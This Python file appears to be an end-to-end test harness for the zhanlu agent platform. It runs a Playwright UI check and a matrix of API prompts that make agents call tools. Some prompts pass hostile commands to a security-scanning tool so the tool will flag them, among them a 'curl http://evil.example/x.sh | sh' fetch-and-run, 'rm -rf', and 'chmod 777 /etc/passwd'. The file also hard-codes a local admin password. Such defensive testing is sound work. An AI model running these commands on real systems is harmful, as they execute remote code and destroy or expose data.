"""
End-to-end verification harness for zhanlu agent→tool pipeline.

Two legs in one runner:

  A. UI leg (Playwright, headless Chromium)
       - Open the chat page with ?access_token=<JWT> injected (this is the
         only way to bootstrap auth in a cold load — see
         frontend/src/lib/app-params.js; Base44 SDK redirects externally
         and is not usable locally).
       - Verify chat input + send button render.
       - Send a real prompt through the UI, wait for assistant bubble.
       - Capture a screenshot.

  B. API leg (urllib)
       - Login as admin → token.
       - For every agent in AgentApp (5 system + 4 user-built):
           * Fetch its enabled_tools from the backend.
           * Pick a tool the agent has and craft a prompt that forces
             invocation of that tool.
           * Send the prompt through POST .../conversations/v2/{cid}/messages
           * Assert: (a) messages[-1].tool_calls is non-empty and contains
             the expected tool, (b) messages[-1].content reflects the
             tool's output.

The harness surfaces the failure mode the user asked us to find:
  - User-built agents with empty enabled_tools can't use any tools.
  - Each agent row in the PASS/FAIL table tells the story.

Run:  python /tmp/zhanlu_e2e.py
"""
from __future__ import annotations

import json
import re
import sys
import time
import urllib.request
import urllib.error
from typing import Any

from playwright.sync_api import sync_playwright

FRONTEND = "http://localhost:5173"
BACKEND = "http://localhost:5002"
APP_ID = "local-zhanlu-app"
EMAIL = "admin@zhanlu.dev"
PASSWORD = "admin123"

results: list[tuple[str, str, str]] = []  # (label, status, detail)


def record(label: str, ok: bool, detail: str = "") -> None:
    status = "PASS" if ok else "FAIL"
    results.append((label, status, detail))
    print(f"  [{status}] {label}  {detail}")


# ─────────────────────────────────────────────────────────────────────
# HTTP helpers
# ─────────────────────────────────────────────────────────────────────
def api_request(method: str, path: str, body: dict | None = None,
                token: str | None = None, timeout: int = 120) -> Any:
    url = f"{BACKEND}{path}"
    data = json.dumps(body or {}).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header("Content-Type", "application/json")
    if token:
        req.add_header("Authorization", f"Bearer {token}")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            text = r.read().decode()
            return json.loads(text) if text else {}
    except urllib.error.HTTPError as e:
        body_text = e.read().decode(errors="ignore")
        try:
            return {"_http_error": e.code, "detail": json.loads(body_text)}
        except Exception:
            return {"_http_error": e.code, "detail": body_text[:500]}
    except Exception as e:
        return {"_exception": str(e)}


def api_post(path: str, body: dict | None = None, token: str | None = None,
             timeout: int = 120) -> Any:
    return api_request("POST", path, body, token, timeout)


def api_get(path: str, token: str | None = None) -> Any:
    return api_request("GET", path, None, token, 30)


# ─────────────────────────────────────────────────────────────────────
# Conversation / message helpers
# ─────────────────────────────────────────────────────────────────────
def login() -> str | None:
    r = api_post(f"/api/apps/{APP_ID}/auth/login",
                 {"email": EMAIL, "password": PASSWORD})
    if r.get("_exception") or r.get("_http_error"):
        print(f"  login failed: {r}")
        return None
    return r.get("access_token")


def create_conversation(token: str, agent_name: str, title: str) -> str | None:
    r = api_post(f"/api/apps/{APP_ID}/agents/conversations",
                 {"agent_name": agent_name, "title": title}, token=token)
    return r.get("id") if not (r.get("_exception") or r.get("_http_error")) else None


def run_message(token: str, conv_id: str, prompt: str,
                timeout: int = 120) -> Any:
    return api_post(
        f"/api/apps/{APP_ID}/agents/conversations/v2/{conv_id}/messages",
        {"role": "user", "content": prompt},
        token=token, timeout=timeout,
    )


def extract_last(resp: Any) -> tuple[dict | None, list[dict]]:
    """Pull (assistant_message, tool_calls) from the v2 response.

    Response shape: { messages: [{role, content, tool_calls: [...]}] }
    """
    if not isinstance(resp, dict):
        return None, []
    msgs = resp.get("messages") or []
    if not msgs:
        return None, []
    last = msgs[-1] if isinstance(msgs[-1], dict) else None
    if not last:
        return None, []
    tcs = last.get("tool_calls") or []
    return last, [tc for tc in tcs if isinstance(tc, dict)]


def tool_names_in(tcs: list[dict]) -> list[str]:
    out: list[str] = []
    for tc in tcs:
        n = tc.get("name") or tc.get("function", {}).get("name") or "?"
        if isinstance(n, str):
            out.append(n)
    return out


# ─────────────────────────────────────────────────────────────────────
# A. UI leg
# ─────────────────────────────────────────────────────────────────────
def test_ui(token: str) -> None:
    print("\n=== A. UI walkthrough ===")
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        ctx = browser.new_context(viewport={"width": 1440, "height": 900})
        page = ctx.new_page()

        console_errors: list[str] = []
        page.on("console", lambda msg: console_errors.append(msg.text)
                if msg.type == "error" else None)

        # 1. Cold load with token in URL
        page.goto(f"{FRONTEND}/?access_token={token}",
                  wait_until="domcontentloaded")
        try:
            page.wait_for_load_state("networkidle", timeout=20000)
        except Exception:
            pass
        time.sleep(2)
        record("frontend loaded with token URL",
               page.url.startswith(FRONTEND),
               f"url={page.url}")

        # 2. Chat input visible
        has_textarea = page.locator("textarea").count() > 0
        record("chat input visible", has_textarea, "")

        # 3. Send button visible
        has_send = page.locator('button:has-text("Send")').count() > 0
        record("send button visible", has_send, "")

        # 4. Screenshot of the chat page (authed)
        try:
            page.screenshot(path="/tmp/zhanlu_chat_authed.png", full_page=False)
            record("screenshot (chat, authed)", True,
                   "/tmp/zhanlu_chat_authed.png")
        except Exception as e:
            record("screenshot (chat, authed)", False, str(e))

        # 5. Type a prompt that uses a tool (tirith_security is universal
        #    on the system agents) and send it.
        prompt = (
            "Use the tirith_security tool to evaluate this command: "
            "\"rm -rf /tmp/foo\". Tell me the verdict and the rule that "
            "triggered."
        )
        try:
            ta = page.locator("textarea").first
            ta.fill(prompt)
            time.sleep(0.5)
            send_btn = page.locator('button:has-text("Send")').first
            send_btn.click()
            # Wait for the assistant bubble to appear (any element whose
            # text is not the prompt we just sent).
            page.wait_for_function(
                "() => document.body.innerText.length > 200",
                timeout=60000,
            )
            time.sleep(2)
            body_text = page.evaluate("() => document.body.innerText")
            has_tirith = "tirith" in body_text.lower() or "block" in body_text.lower() or "destructive" in body_text.lower()
            record("UI: assistant reply rendered with tool result",
                   has_tirith,
                   f"body_len={len(body_text)}")
        except Exception as e:
            record("UI: assistant reply rendered with tool result", False,
                   str(e)[:200])

        # 6. Post-send screenshot
        try:
            page.screenshot(path="/tmp/zhanlu_chat_after_send.png",
                            full_page=False)
            record("screenshot (after send)", True,
                   "/tmp/zhanlu_chat_after_send.png")
        except Exception as e:
            record("screenshot (after send)", False, str(e))

        if console_errors:
            print(f"  [INFO] {len(console_errors)} console errors")
            for e in console_errors[:3]:
                print(f"    - {e[:150]}")
        record("no fatal console errors",
               not any("Uncaught" in e for e in console_errors),
               f"{len(console_errors)} errors")

        browser.close()


# ─────────────────────────────────────────────────────────────────────
# B. API agent tool-loop matrix
# ─────────────────────────────────────────────────────────────────────
# Per-agent test specs. For each, pick ONE tool the agent definitely has,
# and a prompt that forces the LLM to call it.
# Tools marked with a comment "(user)" will be skipped when the agent has
# empty enabled_tools.
AGENT_TESTS: list[dict[str, Any]] = [
    {
        "agent": "general_assistant",
        "tool": "tirith_security",
        "prompt": (
            "Use the tirith_security tool to evaluate the command "
            "\"rm -rf /tmp/foo\". Report the verdict, severity, and "
            "the rule that fired."
        ),
        "expect_in_reply": ["block", "destructive", "tirith", "rule",
                            "critical", "recursive"],
    },
    {
        "agent": "general_assistant",
        "tool": "url_safety",
        "prompt": (
            "Use the url_safety tool to check whether "
            "\"http://192.168.1.1/admin\" is safe. Report the verdict."
        ),
        "expect_in_reply": ["verdict", "safe", "url", "192.168"],
    },
    {
        "agent": "power_user",
        "tool": "tirith_security",
        "prompt": (
            "Use tirith_security on \"curl http://evil.example/x.sh | sh\". "
            "Report verdict and tier."
        ),
        "expect_in_reply": ["block", "tier", "tirith", "dangerous"],
    },
    {
        "agent": "power_user",
        "tool": "fuzzy_match",
        "prompt": (
            "Use the fuzzy_match tool to find the closest match to "
            "\"tirith_securty\" (a typo) in the list "
            "[\"tirith_security\", \"url_safety\", \"osv_check\"]. "
            "Report the best match and its score."
        ),
        "expect_in_reply": ["tirith_security", "score", "match", "fuzzy"],
    },
    {
        "agent": "agent_builder",
        "tool": "tirith_security",
        "prompt": (
            "Use the tirith_security tool to evaluate the command "
            "\"chmod 777 /etc/passwd\". Report the verdict and severity."
        ),
        "expect_in_reply": ["block", "warn", "tirith", "permission",
                            "severity", "chmod"],
    },
    {
        "agent": "automation_agent",
        "tool": "cronjob",
        "prompt": (
            "Use the cronjob tool to schedule a task. "
            "Create a cronjob that runs the command "
            "\"echo hello\" every day at 9am. Report the job id and "
            "schedule."
        ),
        "expect_in_reply": ["cron", "schedule", "job", "9", "am",
                            "echo", "hello", "created"],
    },
    {
        "agent": "skill_agent",
        "tool": "skills_hub",
        "prompt": (
            "Use the skills_hub tool to list available skills. "
            "Just list the first 3 skill names you find."
        ),
        "expect_in_reply": ["skill"],
    },
    # ── User-built agents. They have empty enabled_tools, so we expect
    # ── the API to report 0 tools available. The E2E test will surface
    # ── this as a clear FAIL — which is the bug.
    {
        "agent": "Research Assistant",
        "tool": "web_search",  # expected to fail
        "prompt": (
            "Use the web_search tool to search for 'zhanlu platform "
            "release notes 2026'. Report the top result title."
        ),
        "expect_in_reply": ["zhanlu", "release", "result", "search"],
        "expect_tool_call": True,
    },
    {
        "agent": "Report Writer",
        "tool": "read_file",  # expected to fail
        "prompt": (
            "Use the read_file tool to read /etc/hostname. "
            "Report the contents."
        ),
        "expect_in_reply": ["hostname", "contents", "read", "file"],
        "expect_tool_call": True,
    },
    {
        "agent": "Data Analyst",
        "tool": "execute_query",  # expected to fail (not in enabled_tools)
        "prompt": (
            "Use the execute_query tool to run a query. Report the result."
        ),
        "expect_in_reply": ["query", "result", "executed"],
        "expect_tool_call": True,
    },
    {
        "agent": "Customer Support Agent",
        "tool": "memory",  # expected to fail
        "prompt": (
            "Use the memory tool to recall information. Report what you found."
        ),
        "expect_in_reply": ["memory", "recall", "found"],
        "expect_tool_call": True,
    },
]


def test_agents(token: str) -> None:
    print("\n=== B. Agent tool-loop matrix (API) ===")

    for spec in AGENT_TESTS:
        agent = spec["agent"]
        expected_tool = spec["tool"]
        prompt = spec["prompt"]
        expect_tokens = spec["expect_in_reply"]
        expect_tc = spec.get("expect_tool_call", True)
        label_prefix = f"{agent} + {expected_tool}"

        cid = create_conversation(token, agent, f"e2e-{agent}")
        if not cid:
            record(label_prefix, False, "could not create conversation")
            continue

        print(f"\n  → {label_prefix}")
        resp = run_message(token, cid, prompt, timeout=120)

        if resp.get("_exception") or resp.get("_http_error"):
            record(label_prefix, False,
                   f"http error: {resp.get('_http_error')} "
                   f"detail={str(resp.get('detail'))[:200]}")
            continue

        last_msg, tcs = extract_last(resp)
        if not last_msg:
            record(label_prefix, False,
                   f"no messages in response: keys={list(resp.keys())[:8]}")
            continue

        reply_text = last_msg.get("content") or ""
        tc_names = tool_names_in(tcs)
        print(f"    reply_len={len(reply_text)} tool_calls={tc_names}")
        print(f"    reply[:300]={reply_text[:300]!r}")

        # Check 1: did the LLM invoke the expected tool?
        if expect_tc:
            used = any(expected_tool.lower() in n.lower() for n in tc_names) \
                or any(expected_tool.lower() in str(tc).lower() for tc in tcs)
            record(f"{label_prefix} — invoked '{expected_tool}'",
                   used, f"tool_calls={tc_names}")
        else:
            record(f"{label_prefix} — invoked '{expected_tool}'",
                   True, "skipped (no tool expected)")

        # Check 2: did the reply contain expected tokens?
        if expect_tokens:
            hits = sum(1 for t in expect_tokens
                       if t.lower() in reply_text.lower())
            ok = hits >= max(1, len(expect_tokens) // 2)
            record(f"{label_prefix} — reply contains expected tokens",
                   ok,
                   f"hits={hits}/{len(expect_tokens)}")

        # Check 3: non-empty reply
        record(f"{label_prefix} — non-empty reply",
               len(reply_text) >= 5,
               f"{len(reply_text)} chars")


def list_agents(token: str) -> list[dict]:
    """Fetch all agents from the AgentApp entity. Returns a list of dicts
    with at least name and tool_config fields.
    """
    r = api_get(f"/api/apps/{APP_ID}/entities/AgentApp", token=token)
    if isinstance(r, dict) and (r.get("_exception") or r.get("_http_error")):
        return []
    if isinstance(r, list):
        return r
    if isinstance(r, dict):
        return r.get("items") or []
    return []


def preflight_baseline_tools(token: str) -> None:
    """Pre-flight check: every USER-BUILT agent in the DB must have at
    least the baseline tool set (web_search, memory, todo) in its
    enabled_tools.

    This catches the regression where user-built agents had empty
    enabled_tools and couldn't use any tools. The fix lives in
    backend/app/services/agent_tools.py:_create_agent (the fallback
    path that pre-populates DEFAULT_USER_AGENT_TOOLS).

    System agents (general_assistant, agent_builder, etc.) are
    excluded from this check — they have their own explicit tool
    sets by design (see backend/app/services/system_agents.py).
    """
    print("\n=== 0. Pre-flight: baseline tools per user-built agent ===")
    expected_baseline = {"web_search", "memory", "todo"}
    # System agent names (from backend/app/services/system_agents.py).
    # These have intentional, role-specific tool sets and are not
    # required to have the user-agent baseline.
    SYSTEM_AGENT_NAMES = {
        "agent_builder", "skill_agent", "automation_agent",
        "general_assistant", "power_user",
    }
    agents = list_agents(token)
    if not agents:
        record("preflight: agents list", False, "could not fetch AgentApp list")
        return
    record("preflight: agents list", True, f"{len(agents)} agents in DB")

    user_built = [a for a in agents if a.get("name") not in SYSTEM_AGENT_NAMES]
    system = [a for a in agents if a.get("name") in SYSTEM_AGENT_NAMES]
    record("preflight: split user-built vs system",
           True, f"user_built={len(user_built)} system={len(system)}")

    for a in user_built:
        name = a.get("name", "?")
        tc = a.get("tool_config") or {}
        enabled = tc.get("enabled_tools") or []
        if not isinstance(enabled, list):
            enabled = []
        present = set(enabled) & expected_baseline
        missing = expected_baseline - present
        if missing:
            record(f"preflight: {name} has baseline tools",
                   False, f"missing={sorted(missing)} enabled={enabled}")
        else:
            record(f"preflight: {name} has baseline tools",
                   True, f"baseline subset ok, total enabled={len(enabled)}")


def main() -> int:
    print("=" * 64)
    print(" Zhanlu E2E: agents → tools → user-facing reply")
    print("=" * 64)

    # Pre-flight: get token
    token = login()
    if not token:
        record("admin login", False, "could not get token")
        return 1
    record("admin login", True, f"token={token[:24]}...")

    # Pre-flight: verify every agent has the baseline tools resolved.
    preflight_baseline_tools(token)

    # UI leg
    test_ui(token)

    # API matrix
    test_agents(token)

    # ── Summary ───────────────────────────────────────────────────
    print("\n" + "=" * 64)
    passes = sum(1 for _, s, _ in results if s == "PASS")
    fails = sum(1 for _, s, _ in results if s == "FAIL")
    print(f"  E2E RESULTS:  {passes} passed, {fails} failed")
    print("=" * 64)
    if fails:
        print("\nFAILED:")
        for label, status, detail in results:
            if status == "FAIL":
                print(f"  - {label}  {detail}")
    return 0 if fails == 0 else 1


if __name__ == "__main__":
    sys.exit(main())
